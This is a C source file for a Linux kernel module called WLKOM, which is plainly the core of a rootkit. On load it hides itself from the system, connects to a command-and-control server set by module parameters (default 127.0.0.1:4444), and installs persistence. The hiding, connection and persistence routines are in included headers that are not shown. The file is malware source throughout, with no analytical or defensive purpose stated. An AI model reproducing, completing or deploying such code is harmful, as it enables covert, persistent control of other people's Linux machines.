#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include "hide.h"
#include "connect.h"
#include "persist.h"

#define WLKOM_VERSION "1.0.0"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("WLKOM Team");
MODULE_DESCRIPTION("Wild Linux Kernel Object Module");
MODULE_VERSION(WLKOM_VERSION);

char *c2_ip = "127.0.0.1";
int c2_port = 4444;

module_param(c2_ip, charp, 0644);
MODULE_PARM_DESC(c2_ip, "C2 server IP address");

module_param(c2_port, int, 0644);
MODULE_PARM_DESC(c2_port, "C2 server port");

static int __init wlkom_init(void)
{
    pr_info("WLKOM: module loading...\n");

    hide_module();
    hide_init();

    if (connect_init(c2_ip, c2_port) < 0) {
        pr_err("WLKOM: failed to initialize connection\n");
        return -1;
    }

    if (persist_init() < 0) {
        pr_err("WLKOM: failed to initialize persistence\n");
    }

    pr_info("WLKOM: module loaded\n");
    return 0;
}

static void __exit wlkom_exit(void)
{
    connect_exit();
    hide_exit();
    pr_info("WLKOM: module unloaded\n");
}

module_init(wlkom_init);
module_exit(wlkom_exit);
